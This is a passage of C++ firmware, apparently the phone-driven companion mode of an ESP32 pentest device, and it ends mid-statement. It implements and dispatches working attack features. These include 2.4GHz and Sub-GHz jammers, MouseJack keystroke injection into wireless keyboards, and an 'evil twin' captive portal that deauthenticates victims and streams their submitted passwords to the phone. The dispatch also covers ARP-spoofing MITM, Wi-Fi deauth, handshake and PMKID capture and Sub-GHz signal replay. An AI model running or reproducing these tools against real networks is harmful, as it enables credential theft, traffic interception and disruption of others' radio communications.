// nrf_spectrum.cpp's Received-Power-Detector (RPD) technique and the same exponential
// smoothing as scanChannels(). Streams one EVENT ev="nrf24.scan" data {ch, level} (level
// 0..100) per channel per sweep, then a final ACK ok:true.
static void runNrf24Scan(int secs, uint32_t id) {
    if (!companionNrf24Present()) {
        companionAckMsg(id, false, "no NRF24 module");
        return;
    }
    if (secs < 1) secs = 5;
    if (secs > 60) secs = 60;
    if (!companionNrf24Begin()) {
        companionAckMsg(id, false, "NRF24 init failed");
        return;
    }
    NRFradio.setDataRate(RF24_1MBPS);

    static const int NRF_CH = 80;
    uint8_t level[NRF_CH] = {0};
    uint32_t endT = millis() + (uint32_t)secs * 1000;
    while ((int32_t)(millis() - endT) < 0) {
        if (check(EscPress)) break;
        for (int ch = 0; ch < NRF_CH; ch++) {
            NRFradio.setChannel(ch);
            NRFradio.startListening();
            delayMicroseconds(128);
            NRFradio.stopListening();
            int rpd = NRFradio.testRPD() ? 1 : 0;
            level[ch] = (uint8_t)((level[ch] * 3 + rpd * 100) / 4); // same smoothing as scanChannels()
            JsonDocument out;
            beginEnvelope(out, MSG_EVENT, 0);
            JsonObject d = out["d"].to<JsonObject>();
            d["ev"] = "nrf24.scan";
            JsonObject data = d["data"].to<JsonObject>();
            data["ch"] = ch;
            data["level"] = level[ch];
            sendEnvelope(out);
        }
        delay(30);
    }
    NRFradio.stopListening();
    NRFradio.powerDown();
    companionAckMsg(id, true, "nrf24 scan done");
}

// CRC16-CCITT over an ESB frame - ported verbatim from nrf_mousejack.cpp mj_crcUpdate().
static uint16_t companionEsbCrc(uint16_t crc, uint8_t byte, uint8_t bits) {
    crc = crc ^ ((uint16_t)byte << 8);
    while (bits--) {
        if ((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
        else crc = crc << 1;
    }
    return crc & 0xFFFF;
}

// Validate a promiscuous ESB capture and recover its 5-byte address - ported from
// nrf_mousejack.cpp mj_fingerprint() (handles both 0xAA/0x55 preamble alignments and verifies
// the trailing CRC). On a valid frame, emits EVENT ev="nrf24.dev" data {addr, ch, rssi}.
static void companionEsbFingerprint(const uint8_t *rawBuf, uint8_t size, uint8_t channel, int rssi) {
    if (size < 10) return;
    uint8_t buf[37];
    if (size > 37) size = 37;
    memcpy(buf, rawBuf, size);
    for (int offset = 0; offset < 2; offset++) {
        if (offset == 1) { // try the 1-bit right-shifted alignment
            memcpy(buf, rawBuf, size);
            for (int x = size - 1; x >= 0; x--) {
                if (x > 0) buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
                else buf[x] = buf[x] >> 1;
            }
        }
        uint8_t payloadLength = buf[5] >> 2;
        if (payloadLength == 0 || payloadLength > (size - 9)) continue;
        uint16_t crcGiven =
            ((uint16_t)buf[6 + payloadLength] << 9) | ((uint16_t)buf[7 + payloadLength] << 1);
        crcGiven = (crcGiven << 8) | (crcGiven >> 8);
        if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;
        uint16_t crcCalc = 0xFFFF;
        for (int x = 0; x < 6 + payloadLength; x++) crcCalc = companionEsbCrc(crcCalc, buf[x], 8);
        crcCalc = companionEsbCrc(crcCalc, buf[6 + payloadLength] & 0x80, 1);
        crcCalc = (crcCalc << 8) | (crcCalc >> 8);
        if (crcCalc != crcGiven) continue;
        uint8_t addr[5];
        memcpy(addr, buf, 5);
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "nrf24.dev";
        JsonObject data = d["data"].to<JsonObject>();
        char a[18];
        snprintf(a, sizeof(a), "%02X:%02X:%02X:%02X:%02X", addr[0], addr[1], addr[2], addr[3], addr[4]);
        data["addr"] = a;
        data["ch"] = channel;
        data["rssi"] = rssi; // coarse: nRF24 has no true per-packet RSSI, only the RPD flag
        sendEnvelope(out);
        return;
    }
}

// nrf24_sniff <secs>: promiscuous ESB (Nordic Enhanced ShockBurst) sniff, reusing
// nrf_mousejack.cpp's promiscuous config + CRC fingerprint to recover real device addresses.
// Streams EVENT ev="nrf24.dev" data {addr, ch, rssi} per validated frame, then a final ACK.
static void runNrf24Sniff(int secs, uint32_t id) {
    if (!companionNrf24Present()) {
        companionAckMsg(id, false, "no NRF24 module");
        return;
    }
    if (secs < 1) secs = 10;
    if (secs > 60) secs = 60;
    if (!companionNrf24Begin()) {
        companionAckMsg(id, false, "NRF24 init failed");
        return;
    }
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.setPayloadSize(32);
    NRFradio.setRetries(0, 0);
    NRFradio.flush_rx();
    NRFradio.flush_tx();

    uint32_t endT = millis() + (uint32_t)secs * 1000;
    while ((int32_t)(millis() - endT) < 0) {
        if (check(EscPress)) break;
        for (uint8_t ch = 2; ch <= 84; ch++) { // ESB channel range
            if (check(EscPress) || (int32_t)(millis() - endT) >= 0) break;
            NRFradio.setChannel(ch);
            NRFradio.startListening();
            for (int tries = 0; tries < 6; tries++) {
                delayMicroseconds(500);
                if (NRFradio.available()) {
                    uint8_t rxBuf[32];
                    NRFradio.read(rxBuf, sizeof(rxBuf));
                    int rssi = NRFradio.testRPD() ? -50 : -80;
                    companionEsbFingerprint(rxBuf, 32, ch, rssi);
                }
            }
            NRFradio.stopListening();
            // Yield once per channel. The inner dwell is all delayMicroseconds() (a busy-wait
            // that never yields), so without this a full secs-long sniff would starve the idle
            // task and trip the task watchdog -> reboot. One tick per channel is ample headroom.
            vTaskDelay(1);
        }
    }
    NRFradio.stopListening();
    NRFradio.powerDown();
    companionAckMsg(id, true, "nrf24 sniff done");
}

// nrf24_jammer <secs>: bounded 2.4GHz NRF24 jammer. AUTHORIZED / LAB USE ONLY - this is
// an active transmitter that disrupts the 2.4GHz band (BLE, Wi-Fi, Zigbee, proprietary
// ESB). Only run where you are authorized to. Reuses Bruce's const-carrier jammer via the
// headless wrapper nrf_jammer_headless(); secs is clamped 1..30 and EscPress aborts.
static void runNrf24Jammer(int secs, uint32_t id) {
    if (!companionNrf24Present()) {
        companionAckMsg(id, false, "no NRF24 module");
        return;
    }
    if (secs < 1) secs = 5;
    if (secs > 30) secs = 30;
    int ran = nrf_jammer_headless(secs);
    if (ran < 0) {
        companionAckMsg(id, false, "NRF24 init failed");
        return;
    }
    char buf[32];
    snprintf(buf, sizeof(buf), "nrf24 jammed %ds", ran);
    companionAckMsg(id, true, buf);
}

#if !defined(LITE_VERSION)
// Per-target callback for runNrf24Mousejack: stream one EVENT ev="nrf24.mj" per discovered
// mousejackable device. Signature matches nrf_mousejack_headless()'s onTarget hook.
static void companionMjOnTarget(const uint8_t addr[5], uint8_t ch, const char *type, void *user) {
    (void)user;
    JsonDocument out;
    beginEnvelope(out, MSG_EVENT, 0);
    JsonObject d = out["d"].to<JsonObject>();
    d["ev"] = "nrf24.mj";
    JsonObject data = d["data"].to<JsonObject>();
    char a[18];
    snprintf(a, sizeof(a), "%02X:%02X:%02X:%02X:%02X", addr[0], addr[1], addr[2], addr[3], addr[4]);
    data["addr"] = a;
    data["ch"] = ch;
    data["type"] = type; // "MS", "MS*" (encrypted) or "LG"
    sendEnvelope(out);
}

// nrf24_mousejack <secs> [inject text]: headless MouseJack. AUTHORIZED / LAB USE ONLY.
// Scans for vulnerable Microsoft/Logitech wireless keyboards/mice for <secs> seconds
// (streaming EVENT ev="nrf24.mj" data {addr, ch, type} per device). If inject text is
// given AND a target is found, Bruce's own unencrypted-keystroke injection types that
// text verbatim into the first target. ACK summarizes devices found / injection status.
// Reuses modules/NRF24/nrf_mousejack.cpp (dropped on lite builds -> handled at dispatch).
static void runNrf24Mousejack(int secs, const String &injectText, uint32_t id) {
    if (!companionNrf24Present()) {
        companionAckMsg(id, false, "no NRF24 module");
        return;
    }
    if (secs < 1) secs = 5;
    if (secs > 30) secs = 30;
    String txt = injectText;
    txt.trim();
    bool injected = false;
    int n = nrf_mousejack_headless(
        secs, txt.length() ? txt.c_str() : nullptr, companionMjOnTarget, nullptr, &injected
    );
    char buf[64];
    if (injected) snprintf(buf, sizeof(buf), "nrf24 mousejack: %d device(s), injected", n);
    else if (txt.length())
        snprintf(buf, sizeof(buf), "nrf24 mousejack: %d device(s), none vulnerable to inject", n);
    else snprintf(buf, sizeof(buf), "nrf24 mousejack: %d device(s) found", n);
    companionAckMsg(id, true, buf);
}
#endif // !LITE_VERSION

#else // !COMPANION_HAS_NRF24
// Reply used when an NRF24 command arrives on a board without the nRF24 wiring.
static void sendNoNrf24(uint32_t id) { companionAckMsg(id, false, "no NRF24 module on this board"); }
#endif // COMPANION_HAS_NRF24

// --- Brucia script_run: run a phone-supplied BruceJS script headless + return output ----
// Reuses the interpreter module (modules/bjs_interpreter). run_bjs_script_headless(char*)
// spawns the interpreter task; here we drive it to the foreground and wait synchronously
// (the way the main loop normally does), with console/print output captured into a buffer
// (bjs_capture_*) and execution bounded by a deadline (g_bjsDeadlineMs -> interrupt). The
// whole module is #ifndef LITE_VERSION / DISABLE_INTERPRETER, so lite falls back to a 501.
#if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
static void runScriptRun(const String &src, uint32_t id) {
    String s = src;
    s.trim();
    if (s.length() == 0) {
        sendErr(id, 400, "usage: script_run <js source>");
        return;
    }
    if (s.length() > 6000) { // keep within one protocol frame worth of source
        companionAckMsg(id, false, "script too large");
        return;
    }
    if (interpreter_state > 0 || interpreterTaskHandler != NULL) {
        companionAckMsg(id, false, "interpreter busy");
        return;
    }
    char *code = strdup(s.c_str()); // run_bjs_script_headless takes ownership (frees it)
    if (code == NULL) {
        companionAckMsg(id, false, "out of memory");
        return;
    }
    String captured;
    captured.reserve(256);
    g_bjsDeadlineMs = millis() + 15000; // 15s execution bound
    bjs_capture_begin(&captured);
    if (!run_bjs_script_headless(code)) {
        bjs_capture_end();
        g_bjsDeadlineMs = 0;
        companionAckMsg(id, false, "failed to start interpreter");
        return;
    }
    // Drive like the main loop: move the task to the foreground, then wait for it to finish.
    // interpreter_state: 1 = waiting for foreground, 2 = foreground, 0 = background, -1 = done.
    const uint32_t deadline = millis() + 20000; // wall-clock cap (> execution bound)
    while (interpreter_state == 1 && (int32_t)(millis() - deadline) < 0) vTaskDelay(pdMS_TO_TICKS(5));
    interpreter_state = 2;
    while (interpreter_state > 0 && (int32_t)(millis() - deadline) < 0) vTaskDelay(pdMS_TO_TICKS(20));
    // A backgrounded script (state 0) would keep running; force it to exit for a bounded op.
    if (interpreter_state == 0) {
        interpreter_state = -1;
        uint32_t stopBy = millis() + 2000;
        while (interpreter_state == 0 && (int32_t)(millis() - stopBy) < 0) vTaskDelay(pdMS_TO_TICKS(20));
    }
    bool finished = (interpreter_state <= 0);
    if (interpreter_state == -1) interpreterTaskHandler = NULL;
    bjs_capture_end(); // stop capturing BEFORE the buffer goes out of scope
    g_bjsDeadlineMs = 0;

    if (captured.length() > 1800) {
        captured = captured.substring(0, 1800);
        captured += "...[truncated]";
    }
    if (!finished) {
        companionAckMsg(id, false, "script timeout");
        return;
    }
    companionAckMsg(id, true, captured.c_str());
}
#endif // interpreter

// --- Brucia iButton: headless 1-Wire read / emulate (RW1990). Reuses ibutton.cpp. --------
#ifndef LITE_VERSION
static void runIButtonRead(uint32_t id) {
    String hex;
    if (ibutton_read_headless(hex) == IBUTTON_SUCCESS) {
        String out = "id=" + hex;
        companionAckMsg(id, true, out.c_str());
    } else {
        companionAckMsg(id, false, "no iButton");
    }
}

static void runIButtonWrite(const String &arg, uint32_t id) {
    String a = arg;
    a.trim();
    if (a.length() == 0) {
        sendErr(id, 400, "usage: ibutton_write <idhex> (16 hex chars)");
        return;
    }
    if (ibutton_write_headless(a) == IBUTTON_SUCCESS) companionAckMsg(id, true, "written");
    else companionAckMsg(id, false, "invalid id (need 16 hex chars)");
}
#endif // !LITE_VERSION

// --- Brucia clock: get / set the device RTC. Reuses the RTC + settimeofday path shared by
//     init_clock()/updateClockTimezone(). Works on all boards (software ESP32Time `rtc` or a
//     hardware RTC chip under HAS_RTC); system time (settimeofday) is the source of truth. ---
static void sendClockIso(uint32_t id, bool ok) {
    time_t now = time(nullptr);
    struct tm tmv;
    gmtime_r(&now, &tmv);
    char iso[32];
    strftime(iso, sizeof(iso), "%Y-%m-%dT%H:%M:%SZ", &tmv);
    companionAckMsg(id, ok, iso);
}

static void runClockGet(uint32_t id) { sendClockIso(id, true); }

static void runClockSet(const String &arg, uint32_t id) {
    String a = arg;
    a.trim();
    if (a.length() == 0) {
        sendErr(id, 400, "usage: clock_set <epoch>");
        return;
    }
    long long epoch = atoll(a.c_str());
    if (epoch < 1000000000LL) { // sanity: reject implausible times (before 2001)
        companionAckMsg(id, false, "implausible epoch");
        return;
    }
    time_t t = (time_t)epoch;
#if defined(HAS_RTC)
    struct tm tmv;
    localtime_r(&t, &tmv);
    RTC_TimeTypeDef ts;
    ts.Hours = tmv.tm_hour;
    ts.Minutes = tmv.tm_min;
    ts.Seconds = tmv.tm_sec;
    _rtc.SetTime(&ts);
    RTC_DateTypeDef ds;
    ds.WeekDay = tmv.tm_wday;
    ds.Month = tmv.tm_mon + 1;
    ds.Date = tmv.tm_mday;
    ds.Year = tmv.tm_year + 1900;
    _rtc.SetDate(&ds);
#else
    rtc.setTime((unsigned long)epoch);
    clock_set = true;
#endif
    struct timeval tv = {.tv_sec = t};
    settimeofday(&tv, nullptr);
    sendClockIso(id, true); // echo back the newly set time
}

// Brucia: low-power ("lite") controls the phone can toggle - screen and LED off.
// They auto-restore if the app goes away, so the device never gets stuck dark.
static bool g_screenOff = false;
#if !defined(LITE_VERSION)
// Self-contained BLE HID keyboard for the phone-driven presenter/keyboard. Kept alive across
// commands (ble_hid_begin advertises, the target pairs, then ble_hid_key / ble_hid_type).
static BleKeyboard *g_companionHid = nullptr;
// Map a presenter/keyboard key name to a HID keycode (0 = type the literal text instead).
static uint8_t companionHidKey(const String &name) {
    if (name == "next" || name == "right") return KEY_RIGHT_ARROW;
    if (name == "prev" || name == "left") return KEY_LEFT_ARROW;
    if (name == "up") return KEY_UP_ARROW;
    if (name == "down") return KEY_DOWN_ARROW;
    if (name == "pageup") return KEY_PAGE_UP;
    if (name == "pagedown") return KEY_PAGE_DOWN;
    if (name == "start" || name == "f5") return KEY_F5;
    if (name == "end" || name == "esc") return KEY_ESC;
    if (name == "enter") return KEY_RETURN;
    if (name == "space") return KEY_SPACE;
    if (name == "tab") return KEYTAB;
    return 0;
}
#endif
static bool g_ledOff = false;

static void companionSetScreen(bool on) {
    uint8_t b = bruceConfig.bright > 0 ? (uint8_t)bruceConfig.bright : 100;
    setBrightness(on ? b : 0, false);
    g_screenOff = !on;
}

static void companionSetLed(bool on) {
#ifdef HAS_RGB_LED
    // NOTE: setLedColorConfig() is an INTERACTIVE menu (while(1) waiting for device
    // buttons) - calling it here hangs the device. Apply the configured colour directly.
    if (on) {
        // Make sure the LED is actually visible: restore brightness (it may be 0) and either
        // resume the configured animation or show the solid colour.
        setLedBrightness(bruceConfig.ledBright > 0 ? bruceConfig.ledBright : 50);
        if (bruceConfig.ledEffect > LED_EFFECT_SOLID) ledEffects(true);
        else setLedColor(CRGB(bruceConfig.ledColor));
    } else {
        ledEffects(false);
        setLedColor(CRGB::Black);
    }
#endif
    // Boards without an addressable LED just track the state (no-op).
    g_ledOff = !on;
}

static void companionRestoreOutputs() {
    if (g_screenOff) companionSetScreen(true);
    if (g_ledOff) companionSetLed(true);
}

// A themed status screen for companion mode: connection state + active streams.
static void drawCompanionScreen(bool connected, bool wifi, bool ble, bool subghz) {
    drawMainBorderWithTitle("Brucia Companion");
    padprintln("");
    if (connected) {
        padprintln("App connected.");
        padprintln("");
        padprintln("[ LOCKED - controlled by phone ]");
    } else {
        padprintln("Download the app to connect:");
        padprintln("github.com/1vcian/BruciaDev");
    }
    padprintln("");
    String streams = "Streams: ";
    if (!wifi && !ble && !subghz) {
        streams += "idle";
    } else {
        if (wifi) streams += "WiFi ";
        if (ble) streams += "BLE ";
        if (subghz) streams += "SubGHz ";
    }
    padprintln(streams);
    padprintln("");
    // When the app is connected the device is locked to it; only a deliberate ESC hold exits.
    padprintln(connected ? "Hold or tap ESC to exit." : "Press ESC to exit.");
}

// --- Evil Portal (captive-portal / "evil twin"), phone-driven background session ------------------
// The device runs the fake AP + DNS + captive web server; the phone starts/stops it, optionally with
// a custom HTML template it pushed via fs_write, and receives each captured credential as an EVENT.
#if !defined(LITE_VERSION)
static EvilPortal *g_evilPortal = nullptr;
static String g_evilLastCred = "";

static void evilPortalStop(uint32_t id, bool ack) {
    if (g_evilPortal) {
        delete g_evilPortal; // destructor tears down web server + DNS and restores WiFi mode
        g_evilPortal = nullptr;
    }
    g_evilLastCred = "";
    if (ack) companionAckMsg(id, true, "evil portal stopped");
}

// evil_portal_start <ssid>\t<templatePath>\t<channel>\t<deauth>  (tab-separated; trailing fields
// optional: templatePath may be empty, channel defaults to 1, deauth "1" enables client deauth so
// victims are knocked off their real AP and pushed onto this fake one - the targeted "evil twin").
static void evilPortalStart(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    // Split up to 4 tab-separated fields.
    String f[4] = {"", "", "", ""};
    int fi = 0, start = 0;
    for (int i = 0; i <= args.length() && fi < 4; i++) {
        if (i == args.length() || args[i] == '\t') {
            f[fi++] = args.substring(start, i);
            start = i + 1;
        }
    }
    String ssid = f[0];
    String templatePath = f[1];
    ssid.trim();
    templatePath.trim();
    uint8_t channel = (uint8_t)f[2].toInt();
    if (channel < 1 || channel > 14) channel = 1;
    bool deauth = (f[3].toInt() != 0);
    if (ssid.isEmpty()) ssid = "Free Wifi";
    if (g_evilPortal) evilPortalStop(0, false);
    // autoMode=true so setup() loads the page non-interactively (templatePath, else a default by
    // name) instead of popping a blocking on-device Default/Custom/Main menu that would hang the
    // companion loop waiting for a button press on the device.
    g_evilPortal =
        new EvilPortal(ssid, channel, deauth, false, /*autoMode=*/true, /*backgroundMode=*/true, templatePath);
    if (!g_evilPortal->setup()) {
        delete g_evilPortal;
        g_evilPortal = nullptr;
        companionAckMsg(id, false, "evil portal setup failed");
        return;
    }
    g_evilPortal->beginAP();
    String ip = WiFi.softAPIP().toString();
    char buf[96];
    snprintf(buf, sizeof(buf), "AP '%s' up at %s", g_evilPortal->getApName().c_str(), ip.c_str());
    companionAckMsg(id, true, buf);
}

static void evilPortalStatus(uint32_t id) {
    if (!g_evilPortal) {
        companionAckMsg(id, false, "not running");
        return;
    }
    String ip = WiFi.softAPIP().toString();
    char buf[128];
    snprintf(
        buf, sizeof(buf), "running ap='%s' ip=%s creds=%d", g_evilPortal->getApName().c_str(),
        ip.c_str(), g_evilPortal->hasCredentials() ? 1 : 0
    );
    companionAckMsg(id, true, buf);
}

// Pump the portal each loop iteration and stream a newly captured credential as EVENT evil.cred.
static void evilPortalService() {
    if (!g_evilPortal) return;
    g_evilPortal->processRequests();
    if (g_evilPortal->hasCredentials()) {
        String pass = g_evilPortal->getCapturedPassword();
        if (pass != g_evilLastCred) {
            g_evilLastCred = pass;
            JsonDocument out;
            beginEnvelope(out, MSG_EVENT, 0);
            JsonObject d = out["d"].to<JsonObject>();
            d["ev"] = "evil.cred";
            JsonObject r = d["data"].to<JsonObject>();
            r["ap"] = g_evilPortal->getCapturedSSID(); // portal AP name
            r["pass"] = pass;                          // credential the victim submitted
            sendEnvelope(out);
        }
    }
}
#endif // !LITE_VERSION

// While a bounded/blocking command runs, the companion loop is paused and can't read frames, so a
// long runner would ignore an app-sent stop. Runners call this (non-blocking) poll each loop: it
// reads one pending frame and returns true if it is a CMD "stop" or "<name>_stop", so one generic
// "stop" from the app ends whatever is running. Safe to call at high frequency (guards on
// Serial.available()). Non-stop frames (e.g. a stray ping) are consumed and ignored.
static bool companionPollStop() {
    if (Serial.available() < 4) return false;
    String p;
    if (!readFrame(p, 40)) return false;
    JsonDocument a;
    if (deserializeJson(a, p)) return false;
    if ((a["t"] | 0) != MSG_CMD) return false;
    String cs(a["d"]["cmd"] | "");
    return cs == "stop" || cs.endsWith("_stop");
}

void companionModeUSB(bool headless) {
    // When entered from the menu, show a QR to the latest release so the user can grab the
    // companion app, then wait for it to connect. (Press OK/ESC on the QR to continue.)
    // When entered headless (from the `companion` CLI command), the app is already talking
    // to us over serial, so skip the blocking QR screen and go straight to the loop.
    if (!headless) { qrcode_display("https://github.com/1vcian/BruciaDev/releases/latest"); }

    // Probe the shared-SPI peripherals (NRF24 / W5500) exactly once, here, before the status
    // screen starts redrawing in the service loop. This serializes the single risky bus probe
    // away from display traffic and guarantees it never repeats on the app's HELLO retries -
    // the primary fix for the "reboots while connected" report. See the caching note up top.
    companionWarmCaps();

    drawCompanionScreen(false, false, false, false);

    // Take exclusive ownership of the USB-CDC serial for the protocol.
    if (serialcmdsTaskHandle) vTaskSuspend(serialcmdsTaskHandle);
    while (Serial.available()) Serial.read(); // drain stale bytes
    g_companionActive = true; // from here Serial is the framed protocol: mute module debug prints

    bool helloSeen = false;
    bool subWifiAp = false; // wifi.ap stream subscription
    bool subBleOn = false;  // ble.scan stream subscription (for the status screen)
    bool subGhzOn = false;  // subghz.raw stream subscription (for the status screen)
    bool scanning = false;  // an async WiFi scan is in flight
    uint32_t lastFrame = millis(); // for auto-restoring screen/LED if the app vanishes
    // App-mode input lock: once the app is connected (helloSeen), the device is "locked" to the
    // phone - the wheel/OK and a short ESC tap do nothing, so the only control is the app. A
    // deliberate ESC HOLD (~700ms) still exits companion mode (which disconnects the app); the
    // user then taps Connect in the app to re-enter the lock. Repeated ESC taps also accumulate
    // toward the hold threshold, so the device can never get stuck locked. Before the app
    // connects, a single ESC leaves immediately (e.g. if you opened companion mode by mistake).
    uint32_t escHoldStart = 0, escLastSeen = 0;
    int escEdges = 0;
    // Set by the "companion_exit" command: the app asks us to leave companion mode and return to the
    // normal UI (so its raw-CLI remote-control screen mirror works and the device is usable again).
    bool leaveForRemote = false;

    while (true) {
        if (leaveForRemote) break;
        if (!helloSeen) {
            if (check(EscPress)) break; // not locked yet: a single ESC leaves
        } else {
            // Locked to the app: swallow local wheel/OK so they never act, and clear any encoder
            // backlog, so the device feels fully controlled by the phone (fixes the "flaky input
            // while connected" report).
            NextPress = PrevPress = SelPress = UpPress = DownPress = AnyKeyPress = false;
            RotaryNetSteps = 0;
            uint32_t now = millis();
            // Three independent ways out, so the device can NEVER get stuck locked on any board:
            //  (a) a deliberate ESC hold (~700ms) - works where the ESC pin re-fires while held;
            //  (b) several ESC taps (>=8) - works on boards that only edge-trigger ESC per press;
            //  (c) the app being gone for 60s (unplugged/crashed) - auto-leave companion mode.
            if (check(EscPress)) {
                if (escHoldStart == 0) escHoldStart = now;
                escLastSeen = now;
                escEdges++;
                if (now - escHoldStart > 700 || escEdges >= 8) break;
            } else if (escLastSeen != 0 && now - escLastSeen > 2000) {
                escHoldStart = 0; // long quiet: forget the partial hold / stray taps
                escEdges = 0;
            }
            if (now - lastFrame > 60000) break; // app vanished -> never stay locked forever
        }

        // Auto-restore screen/LED if the app has been silent for a while (e.g. it
        // disconnected): never leave the device stuck with the screen/LED off.
        if ((g_screenOff || g_ledOff) && millis() - lastFrame > 15000) {
            companionRestoreOutputs();
        }

        // 1) Service one incoming frame if present. Short timeout keeps both the
        //    ESC check and the scan servicing below responsive.
        String payload;
        if (readFrame(payload, 20)) {
            lastFrame = millis();
            JsonDocument in;
            DeserializationError err = deserializeJson(in, payload);
            if (err) {
                sendErr(0, 400, "bad json");
            } else {
                uint8_t t = in["t"] | 0;
                uint32_t id = in["id"] | 0;
                switch (t) {
                    case MSG_HELLO:
                        sendCaps(id);
                        if (!helloSeen) {
                            helloSeen = true;
                            drawCompanionScreen(true, subWifiAp, subBleOn, subGhzOn);
                        }
                        break;
                    case MSG_PING: sendPong(id); break;
                    case MSG_CMD: {
                        const char *cmd = in["d"]["cmd"] | "";
                        String cmdStr(cmd);
                        // Leave companion mode on request (used before remote control, which drives the
                        // normal UI over raw CLI and needs the serial task back + no app-lock).
                        if (cmdStr == "companion_exit") {
                            companionAckMsg(id, true, "leaving companion mode");
                            leaveForRemote = true;
                            break;
                        }
                        if (cmdStr.startsWith("fs_read ")) {
                            fsReadStream(cmdStr.substring(8), id);
                            break;
                        }
                        // Brucia: push a file to the device storage. fs_write truncates+writes;
                        // fs_write_append streams further chunks onto it. (append checked first:
                        // "fs_write_append " does not start with "fs_write ", but keep it explicit.)
                        if (cmdStr.startsWith("fs_write_append ")) {
                            fsWriteCmd(cmdStr.substring(16), id, true);
                            break;
                        }
                        if (cmdStr.startsWith("fs_write ")) {
                            fsWriteCmd(cmdStr.substring(9), id, false);
                            break;
                        }
                        // Brucia: phone-driven, time-bounded Wi-Fi deauth of a target AP.
                        //   wifi_deauth <bssid> <channel> <seconds>
                        if (cmdStr.startsWith("wifi_deauth ")) {
                            runWifiDeauth(cmdStr.substring(12), id);
                            break;
                        }
                        // Brucia: phone-driven, time-bounded ARP MITM. The ESP joins the given
                        // Wi-Fi (STA) then ARP-poisons the target <-> gateway so their traffic
                        // routes through the device (transparent MITM redirect). Reuses NetCut's
                        // ARP injection via runArpSpoofBounded(). AUTHORIZED / LAB USE ONLY.
                        //   arp_spoof <ssid> <pass> <target_ip> <gateway_ip> <secs>
                        if (cmdStr.startsWith("arp_spoof ")) {
                            runArpSpoof(cmdStr.substring(10), id);
                            break;
                        }
                        // Brucia Sub-GHz (CC1101): record+replay a raw signal.
                        //   subghz_replay <freqKHz> <secs> [repeats]
                        if (cmdStr.startsWith("subghz_replay ")) {
                            runSubghzReplay(cmdStr.substring(14), id);
                            break;
                        }
                        // Brucia Sub-GHz (CC1101): transmit an explicit edge list.
                        //   subghz_tx_raw <freqKHz> <te> <csv durations>
                        if (cmdStr.startsWith("subghz_tx_raw ")) {
                            runSubghzTxRaw(cmdStr.substring(14), id);
                            break;
                        }
                        // Brucia Sub-GHz (CC1101): bounded noise jammer. LAB USE ONLY.
                        //   subghz_jammer <freqKHz> <secs>
                        if (cmdStr.startsWith("subghz_jammer ")) {
                            runSubghzJammer(cmdStr.substring(14), id);
                            break;
                        }
                        // Brucia Sub-GHz (CC1101): set RX/TX parameters.
                        //   subghz_config <freqKHz> [modulation] [bandwidth] [datarate]
                        if (cmdStr.startsWith("subghz_config ")) {
                            runSubghzConfig(cmdStr.substring(14), id);
                            break;
                        }
                        // Brucia IR: headless TV-B-Gone power-off blast. AUTHORIZED USE ONLY.
                        //   ir_tvbgone [na|eu]
                        if (cmdStr == "ir_tvbgone" || cmdStr.startsWith("ir_tvbgone ")) {
                            runIrTvbgone(cmdStr.length() > 10 ? cmdStr.substring(11) : String(""), id);
                            break;
                        }
                        // Brucia IR: learn/receive one IR code (~10s window).
                        //   ir_rx
                        if (cmdStr == "ir_rx") {
                            runIrRx(id);
                            break;
                        }
                        // Brucia IR: replay a raw IR timing list from the phone.
                        //   ir_tx_raw <khz> <csv durations>
                        if (cmdStr.startsWith("ir_tx_raw ")) {
                            runIrTxRaw(cmdStr.substring(10), id);
                            break;
                        }
                        // Brucia lite controls: screen/LED on-off from the phone.
                        if (cmdStr.startsWith("scr ")) {
                            companionSetScreen(cmdStr.substring(4).toInt() != 0);
                            sendAck(id, true);
                            break;
                        }
                        if (cmdStr.startsWith("led ")) {
                            companionSetLed(cmdStr.substring(4).toInt() != 0);
                            sendAck(id, true);
                            break;
                        }
                        // Brucia: phone-driven handshake capture.
                        //   wifi_handshake <bssid> <channel> <seconds> <ssid...>
                        if (cmdStr.startsWith("wifi_handshake ")) {
                            String a = cmdStr.substring(15);
                            a.trim();
                            int s1 = a.indexOf(' '), s2 = a.indexOf(' ', s1 + 1), s3 = a.indexOf(' ', s2 + 1);
                            if (s1 < 0 || s2 < 0) {
                                sendErr(id, 400, "usage: wifi_handshake <bssid> <channel> <seconds> [ssid]");
                            } else {
                                String bssid = a.substring(0, s1);
                                int channel = a.substring(s1 + 1, s2).toInt();
                                int secs = (s3 > 0 ? a.substring(s2 + 1, s3) : a.substring(s2 + 1)).toInt();
                                String ssid = s3 > 0 ? a.substring(s3 + 1) : "";
                                if (channel < 1 || channel > 14) channel = 1;
                                if (secs < 5) secs = 30;
                                if (secs > 120) secs = 120;
#if !defined(LITE_VERSION)
                                bool ok = capture_handshake_bounded(ssid, bssid, (uint8_t)channel, (uint32_t)secs);
                                JsonDocument o;
                                beginEnvelope(o, MSG_ACK, id);
                                JsonObject d = o["d"].to<JsonObject>();
                                d["ok"] = ok;
                                d["out"] = ok ? "handshake captured in /BrucePCAP/handshakes/"
                                              : "no handshake (try again, closer, more time)";
                                sendEnvelope(o);
#else
                                sendErr(id, 501, "wifi_handshake not available in this (lite) build");
#endif
                            }
                            break;
                        }
                        // Brucia: phone-driven, clientless PMKID capture.
                        //   wifi_pmkid <bssid> <channel> <seconds>
                        if (cmdStr.startsWith("wifi_pmkid ")) {
                            String a = cmdStr.substring(11);
                            a.trim();
                            int s1 = a.indexOf(' ');
                            int s2 = s1 >= 0 ? a.indexOf(' ', s1 + 1) : -1;
                            if (s1 < 0 || s2 < 0) {
                                sendErr(id, 400, "usage: wifi_pmkid <bssid> <channel> <seconds>");
                            } else {
                                String bssid = a.substring(0, s1);
                                int channel = a.substring(s1 + 1, s2).toInt();
                                int secs = a.substring(s2 + 1).toInt();
                                bssid.replace(":", "");
                                bssid.trim();
                                if (bssid.length() != 12) {
                                    sendErr(id, 400, "bad bssid");
                                    break;
                                }
                                String mac = "";
                                for (int i = 0; i < 6; i++) {
                                    if (i) mac += ":";
                                    mac += bssid.substring(i * 2, i * 2 + 2);
                                }
                                if (channel < 1 || channel > 14) channel = 1;
                                if (secs < 5) secs = 5;
                                if (secs > 120) secs = 120;
#if !defined(LITE_VERSION)
                                String outPath;
                                bool ok = capture_pmkid_bounded(
